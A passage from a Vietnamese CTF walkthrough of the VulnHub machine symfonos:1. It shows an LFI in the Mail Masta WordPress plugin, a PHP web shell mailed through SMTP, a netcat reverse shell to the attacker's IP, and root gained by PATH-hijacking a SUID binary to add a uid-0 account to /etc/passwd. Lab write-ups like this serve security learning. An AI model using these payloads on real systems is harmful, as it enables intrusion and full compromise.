</span></span><span class=line><span class=cl>Next person I find using one of these passwords will be fired!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-Zeus
</span></span></code></pre></td></tr></table></div></div></li><li><p>Thử mấy cái <code>epidioko</code>, <code>qwerty</code> với <code>baseball</code> xem thần Zeus có block thật hay không :v:</p></li><li><p>Thử được thư mục helios có mật khẩu là <code>qwerty</code> thật :joy:</p></li><li><p>Có 2 mẩu tin ở đây</p></li><li><p>file <code>research.txt</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
</span></span></code></pre></td></tr></table></div></div></li><li><p>file <code>todo.txt</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. Binge watch Dexter
</span></span><span class=line><span class=cl>2. Dance
</span></span><span class=line><span class=cl>3. Work on /h3l105
</span></span></code></pre></td></tr></table></div></div></li><li><p>Humm, thử vào http://192.168.19.34/h3l105 xem sao. (À quên, add <code>192.168.19.34 symfonos.local</code> vào /etc/hosts đã)</p></li><li><p>1 trang Wordpress</p><p><img loading=lazy src=https://images.viblo.asia/9d3b1b6d-4165-4217-a326-ac3a43d25efb.png alt></p></li><li><p>Sử dụng <code>wpscan</code> thì thấy có lỗi như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali:~# wpscan --url http://symfonos.local/h3l105/ --plugins-detection aggressive
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> mail-masta
</span></span><span class=line><span class=cl> <span class=p>|</span> Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
</span></span><span class=line><span class=cl> <span class=p>|</span> Latest Version: 1.0 <span class=o>(</span>up to date<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Last Updated: 2014-09-19T07:52:00.000Z
</span></span><span class=line><span class=cl> <span class=p>|</span> Readme: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Directory listing is enabled
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Detected By: Known Locations <span class=o>(</span>Aggressive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> <span class=m>2</span> vulnerabilities identified:
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion <span class=o>(</span>LFI<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>     References:
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wpvulndb.com/vulnerabilities/8609
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://www.exploit-db.com/exploits/40290/
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://cxsecurity.com/issue/WLB-2016080220
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: Mail Masta 1.0 - Multiple SQL Injection
</span></span><span class=line><span class=cl> <span class=p>|</span>     References:
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wpvulndb.com/vulnerabilities/8740
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2017-6095
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2017-6096
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2017-6097
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2017-6098
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Version: 1.0 <span class=o>(</span>100% confidence<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Detected By: Readme - Stable Tag <span class=o>(</span>Aggressive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
</span></span><span class=line><span class=cl> <span class=p>|</span> Confirmed By: Readme - ChangeLog Section <span class=o>(</span>Aggressive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
</span></span></code></pre></td></tr></table></div></div></li><li><p>Đọc một hồi về plugin <code>mail-masta</code> thì ở đây có dính Local File Inclusion (LFI)</p><p><a href="http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</a>
<img loading=lazy src=https://images.viblo.asia/b5102935-8350-4f5a-8d00-3a48e558d46a.png alt></p></li><li><p>Ở file <code>/etc/passwd</code> ta xác định được có những user sau</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>helios
</span></span><span class=line><span class=cl>mysql
</span></span><span class=line><span class=cl>zeus
</span></span><span class=line><span class=cl>wordpress
</span></span></code></pre></td></tr></table></div></div></li><li><p>Check lại bằng <code>smtp-user-enum</code> thì có đúng 3 users này có mail.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali:~# smtp-user-enum -M VRFY -U users.txt -t 192.168.19.34
</span></span><span class=line><span class=cl>Starting smtp-user-enum v1.2 <span class=o>(</span> http://pentestmonkey.net/tools/smtp-user-enum <span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> ----------------------------------------------------------
</span></span><span class=line><span class=cl><span class=p>|</span>                   Scan Information                       <span class=p>|</span>
</span></span><span class=line><span class=cl> ----------------------------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode ..................... VRFY
</span></span><span class=line><span class=cl>Worker Processes ......... <span class=m>3</span>
</span></span><span class=line><span class=cl>Usernames file ........... users.txt
</span></span><span class=line><span class=cl>Target count ............. <span class=m>1</span>
</span></span><span class=line><span class=cl>Username count ........... <span class=m>3</span>
</span></span><span class=line><span class=cl>Target TCP port .......... <span class=m>25</span>
</span></span><span class=line><span class=cl>Query timeout ............ <span class=m>3</span> secs
</span></span><span class=line><span class=cl>Target domain ............ 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>######## Scan started at Wed Jul 10 16:07:52 2019 #########</span>
</span></span><span class=line><span class=cl>192.168.19.34: root exists
</span></span><span class=line><span class=cl>192.168.19.34: helios exists
</span></span><span class=line><span class=cl>192.168.19.34: mysql exists
</span></span><span class=line><span class=cl><span class=c1>######## Scan completed at Wed Jul 10 16:07:53 2019 #########</span>
</span></span><span class=line><span class=cl><span class=m>3</span> results.
</span></span></code></pre></td></tr></table></div></div></li><li><p>Chắc hẳn là phải có thư mục chứa mail, mình có thể đọc được mail người khác gửi đến <code>helios</code>
<img loading=lazy src=https://images.viblo.asia/cf92086e-ad3f-4eec-a029-0661de4f6456.png alt></p></li><li><p>Thử gửi thư với payload cho <code>helios</code> xem sao</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali:~# telnet 192.168.19.34 <span class=m>25</span>
</span></span><span class=line><span class=cl>Trying 192.168.19.34...
</span></span><span class=line><span class=cl>Connected to 192.168.19.34.
</span></span><span class=line><span class=cl>Escape character is <span class=s1>&#39;^]&#39;</span>.
</span></span><span class=line><span class=cl><span class=m>220</span> symfonos.localdomain ESMTP Postfix <span class=o>(</span>Debian/GNU<span class=o>)</span>
</span></span><span class=line><span class=cl>HELO localhost
</span></span><span class=line><span class=cl><span class=m>250</span> symfonos.localdomain
</span></span><span class=line><span class=cl>MAIL FROM: tuan@symfonos.localdomain
</span></span><span class=line><span class=cl><span class=m>250</span> 2.1.0 Ok
</span></span><span class=line><span class=cl>RCPT TO: helios
</span></span><span class=line><span class=cl><span class=m>250</span> 2.1.5 Ok
</span></span><span class=line><span class=cl>DATA
</span></span><span class=line><span class=cl><span class=m>354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
</span></span><span class=line><span class=cl>&lt;?php system<span class=o>(</span><span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;c&#39;</span><span class=o>])</span><span class=p>;</span> ?&gt;
</span></span></code></pre></td></tr></table></div></div></li><li><p>Giờ ta sử dụng đường dẫn sau để kiểm tra xem sao:</p><p><code>view-source:http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;c=id</code>
<img loading=lazy src=https://images.viblo.asia/9f83bba3-89d2-4752-ae4a-78c701946e24.png alt></p></li><li><p>Ok thành công rồi, chúng ta đã có 1 chú shell =))</p></li><li><p>Tiếp theo thì ta remote đến nó thôi</p></li><li><p>Đầu tiên thì mở <code>nc -lvp 4444</code> bên máy mình đã</p></li><li><p>Sử dụng <a href="http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;c=nc%20-e%20/bin/bash%20-nv%20192.168.19.100%204444">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;c=nc%20-e%20/bin/bash%20-nv%20192.168.19.100%204444</a> để remote ngược về.
<img loading=lazy src=https://images.viblo.asia/01bfd890-cbe7-42ac-9bb5-b8b42b1446eb.png alt></p></li><li><p>Ngon, chúng ta đã có máy victim rồi :v:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>helios@symfonos:/home$ find / -perm -u<span class=o>=</span>s 2&gt;/dev/null
</span></span><span class=line><span class=cl>find / -perm -u<span class=o>=</span>s 2&gt;/dev/null
</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
</span></span><span class=line><span class=cl>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
</span></span><span class=line><span class=cl>/usr/bin/passwd
</span></span><span class=line><span class=cl>/usr/bin/gpasswd
</span></span><span class=line><span class=cl>/usr/bin/newgrp
</span></span><span class=line><span class=cl>/usr/bin/chsh
</span></span><span class=line><span class=cl>/usr/bin/chfn
</span></span><span class=line><span class=cl>/opt/statuscheck
</span></span><span class=line><span class=cl>/bin/mount
</span></span><span class=line><span class=cl>/bin/umount
</span></span><span class=line><span class=cl>/bin/su
</span></span><span class=line><span class=cl>/bin/ping
</span></span><span class=line><span class=cl>helios@symfonos:/home$ 
</span></span></code></pre></td></tr></table></div></div></li><li><p>Có vẻ như <code>/opt/statuscheck</code> có thể khai thác được, thử run nó lên xem có gì k</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>helios@symfonos:/opt$ ./statuscheck
</span></span><span class=line><span class=cl>./statuscheck
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Date: Thu, <span class=m>11</span> Jul <span class=m>2019</span> 01:49:50 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.25 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl>Last-Modified: Sat, <span class=m>29</span> Jun <span class=m>2019</span> 00:38:05 GMT
</span></span><span class=line><span class=cl>ETag: <span class=s2>&#34;148-58c6b9bb3bc5b&#34;</span>
</span></span><span class=line><span class=cl>Accept-Ranges: bytes
</span></span><span class=line><span class=cl>Content-Length: <span class=m>328</span>
</span></span><span class=line><span class=cl>Vary: Accept-Encoding
</span></span><span class=line><span class=cl>Content-Type: text/html
</span></span></code></pre></td></tr></table></div></div></li><li><p>Humm, nó chỉ kiểm tra cái trang web có Ok hay k, thử chạy <code>strings /opt/statuscheck</code> thì ra 1 đoạn này</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -I H
</span></span><span class=line><span class=cl>http://lH
</span></span><span class=line><span class=cl>ocalhostH
</span></span></code></pre></td></tr></table></div></div><p>Dịch ra sẽ là:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -I http://localhost
</span></span></code></pre></td></tr></table></div></div></li><li><p>Chúng ta cần khám phá được lệnh thực thi này</p></li><li><p>Có vài phương thức, nhưng ở trong trường hợp này, dựa trên đầu ra <code>curl ...</code> nó đang thực thi với <strong>đường dẫn tương đối</strong> của nó, có nghĩa là, với đường dẫn có trong biến môi trường <strong>$PATH</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PATH ABSOLUTE: /usr/bin/curl
</span></span><span class=line><span class=cl>PATH RELATIVELY: curl
</span></span></code></pre></td></tr></table></div></div></li><li><p><em>Việc của chúng ta bây giờ là phải thay đổi biến $PATH của <code>helios</code> và chuyển hướng của chương trình <code>statuscheck</code> sang một thứ mà ta có thể kiểm soát được. Thay vì chạy trong <code>/usr/bin/curl</code>, ta sẽ điều hướng về để nó thực thi trong <code>/tmp/curl</code> chẳng hạn.</em></p></li><li><p>Giờ chúng ta vào thư mục <code>/tmp</code> rồi tạo 1 file <code>curl</code>, trong file đó có thứ mình muốn để nó chạy lên với quyền <code>root</code>, vì khi chạy <code>/opt/statuscheck</code>, nó sẽ kích hoạt quyền <code>root</code> lên. Và với cái <code>curl</code> giả kia, bạn có thể chạy quyền <code>root</code> với nội dung là bên trong cái file <code>curl</code> vừa tạo.</p></li><li><p>Ở đây mình sẽ chọn cách thêm luôn 1 tài khoản <code>root</code> vào hệ thống.</p></li><li><p>Cấu trúc của file <code>/etc/passwd</code>:
<code>username:password_crypt:user_id:group_id:name:home_directory:shell</code></p></li><li><p>Vậy giờ mình sẽ tạo 1 file như này :
<code>minhtuan:x:0:0:root:/root:/usr/bin/bash</code> với <code>x</code> là mật khẩu được <code>crypt</code>.</p><p>Mình sẽ sử dụng <code>perl</code> để <code>crypt</code> password.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali:~# perl -e <span class=s1>&#39;print crypt(&#34;minhtuanact&#34;, &#34;ahihi&#34;)&#39;</span>
</span></span><span class=line><span class=cl>ahd.h7gFshGUw
</span></span></code></pre></td></tr></table></div></div></li><li><p>Vậy <code>ahd.h7gFshGUw</code> là <code>password crypt</code>, hoàn thiện đoạn thêm user kia sẽ là:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>minhtuan:ahd.h7gFshGUw:0:0:root:/root:/usr/bin/bash
</span></span></code></pre></td></tr></table></div></div></li><li><p>Giờ sẽ ghi vào file <code>/tmp/curl</code> với nội dung sẽ là</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> minhtuan:ahd.h7gFshGUw:0:0:root:/root:/bin/bash &gt;&gt; /etc/passwd
</span></span></code></pre></td></tr></table></div></div><p>Lệnh này nó sẽ thêm cái tài khoản của mình mới tạo kia vào <code>/etc/passwd</code>. Giờ sẽ phải đánh lừa <code>statuscheck</code> để nó chạy cái thằng <code>curl</code> giả kia lên rồi đăng nhập với tài khoản vừa tạo là xong :v:</p></li><li><p>Xúc thôi :v:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>helios@symfonos:/tmp$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/tmp
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/tmp
</span></span><span class=line><span class=cl>helios@symfonos:/tmp$ /opt/statuscheck
</span></span><span class=line><span class=cl>/opt/statuscheck
</span></span><span class=line><span class=cl>sh: 1: curl: Permission denied
</span></span><span class=line><span class=cl>helios@symfonos:/tmp$ 
</span></span></code></pre></td></tr></table></div></div></li><li><p>Ơ <code>Permission denied</code>, à chết quên chưa cấp quyền cho file <code>curl</code> :joy:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>helios@symfonos:/tmp$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span><span class=nv>$PATH_BACKUP</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span><span class=nv>$PATH_BACKUP</span>
</span></span><span class=line><span class=cl>helios@symfonos:/tmp$ chmod +x curl
</span></span><span class=line><span class=cl>chmod +x curl
</span></span><span class=line><span class=cl>helios@symfonos:/tmp$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/tmp
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/tmp
</span></span><span class=line><span class=cl>helios@symfonos:/tmp$ /opt/statuscheck
</span></span><span class=line><span class=cl>/opt/statuscheck
</span></span><span class=line><span class=cl>helios@symfonos:/tmp$ 
</span></span></code></pre></td></tr></table></div></div></li><li><p>Ok rồi, thử switch sang tài khoản vừa được tạo xem (trước tiên phải chạy <code>export PATH=$PATH_BACKUP</code> trước nhé, không là k có lệnh thực thi đâu)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>helios@symfonos:/tmp$ su minhtuan
</span></span><span class=line><span class=cl>su minhtuan
</span></span><span class=line><span class=cl>Password: minhtuanact
</span></span><span class=line><span class=cl>root@symfonos:/tmp# id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>Vậy là ta đã có quyền root rồi. Đọc cờ cuối thôi
<img loading=lazy src=https://images.viblo.asia/ce773acd-b4d0-49d4-9124-ed97373682af.png alt></p></li></ul><h2 id=tổng-kết>Tổng kết<a hidden class=anchor aria-hidden=true href=#tổng-kết>#</a></h2><ul><li>Bài này ở mức độ <strong>Beginner</strong> nhưng mình chẳng thấy nó <strong>Beginner</strong> tý nào lắm :joy::joy:</li><li>Mong các bạn có thể học hỏi được gì thông qua bài này. Nếu các bạn cảm thấy hay thì cho mình 1 upvote nhé :D</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/cybersecurity/>CyberSecurity</a></li><li><a href=https://minhtuanact.github.io/tags/labs/>Labs</a></li><li><a href=https://minhtuanact.github.io/tags/local-file-inclusion/>Local File Inclusion</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.github.io/posts/linux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux/><span class=title>« Prev</span><br><span>Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux</span>
</a><a class=next href=https://minhtuanact.github.io/posts/su-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf/><span class=title>Next »</span><br><span>Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution on twitter" href="https://twitter.com/intent/tweet/?text=VulnHub%20CTF%20-%20symfonos%3a%201%20-%20V%e1%ba%abn%20l%c3%a0%20m%e1%bb%99t%20v%c3%a0i%20plugin%20c%e1%bb%a7a%20Wordpress%2c%20c%e1%ba%a9n%20th%e1%ba%adn%20khi%20s%e1%bb%ad%20d%e1%bb%a5ng%20plugin%20b%c3%aan%20Wordpress%20-%20SMTP%20-%20T%e1%bb%ab%20LFI%20cho%20%c4%91%e1%ba%bfn%20Remote%20Code%20Excecution&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution%2f&amp;hashtags=CyberSecurity%2clabs%2cLocalFileInclusion"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution%2f&amp;title=VulnHub%20CTF%20-%20symfonos%3a%201%20-%20V%e1%ba%abn%20l%c3%a0%20m%e1%bb%99t%20v%c3%a0i%20plugin%20c%e1%bb%a7a%20Wordpress%2c%20c%e1%ba%a9n%20th%e1%ba%adn%20khi%20s%e1%bb%ad%20d%e1%bb%a5ng%20plugin%20b%c3%aan%20Wordpress%20-%20SMTP%20-%20T%e1%bb%ab%20LFI%20cho%20%c4%91%e1%ba%bfn%20Remote%20Code%20Excecution&amp;summary=VulnHub%20CTF%20-%20symfonos%3a%201%20-%20V%e1%ba%abn%20l%c3%a0%20m%e1%bb%99t%20v%c3%a0i%20plugin%20c%e1%bb%a7a%20Wordpress%2c%20c%e1%ba%a9n%20th%e1%ba%adn%20khi%20s%e1%bb%ad%20d%e1%bb%a5ng%20plugin%20b%c3%aan%20Wordpress%20-%20SMTP%20-%20T%e1%bb%ab%20LFI%20cho%20%c4%91%e1%ba%bfn%20Remote%20Code%20Excecution&amp;source=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 